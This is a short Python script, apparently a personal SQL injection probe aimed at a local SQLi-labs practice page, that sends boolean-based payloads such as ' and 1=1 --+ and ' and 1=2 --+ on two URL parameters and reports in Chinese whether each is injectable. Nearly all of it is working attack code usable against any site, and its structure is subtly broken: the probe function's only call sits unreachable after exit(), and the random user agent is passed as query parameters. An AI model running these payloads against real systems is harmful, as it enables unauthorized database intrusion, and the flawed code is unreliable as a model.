#!/usr/bin/python3
# -*- coding: utf-8 -*-
import  requests
import socket
import time
import urllib.parse
import re
from fake_useragent import UserAgent


def sql():
    global url
    global a
    #url=input('[^]Please enter the URL that needs test injection：').lower()
    url="http://192.168.137.108/sqli/Less-1/index.php?id=1&c=22"
    a = re.split('[?|&]', url)
    print(a[1])
    if url !=None:
        time.sleep(0.5)
        ua = UserAgent()
        r=requests.get(url,ua.random)
        status=r.status_code
        if status == 200:
            print('[^]成功访问网站')
        else:
            print('[~]访问失败',status)
            exit()
sql()

def SQLPOC():
    headers=UserAgent()
    url1=a[0] + '?' +a[1] +'\'%20and%201=1%20--+'
    url2=a[0] + '?' +a[1] +'\'%20and%201=2%20--+'
    zhusx=requests.get(url,headers.random).content
    zhus=requests.get(url1,headers.random).content
    zhuss=requests.get(url2,headers.random).content
    if zhusx == zhus and zhusx !=zhuss:
        print('[^]参数1存在sql注入')
    else:
        print('[~]参数1不存在漏洞')
        exit()
    url3 = a[0] + '?' + a[1] + '&' + a[2] + '\'%20and%201=1%20--+'
    url4 = a[0] + '?' + a[1] + '&' +  a[2] + '\'%20and%201=2%20--+'
    aaa = requests.get(url, headers.random).content
    bbb = requests.get(url3, headers.random).content
    ccc = requests.get(url4, headers.random).content
    if aaa == bbb and aaa != ccc:
        print('[^]参数2存在sql注入')
    else:
        print('[~]参数2不存在漏洞')
        exit()
		SQLPOC()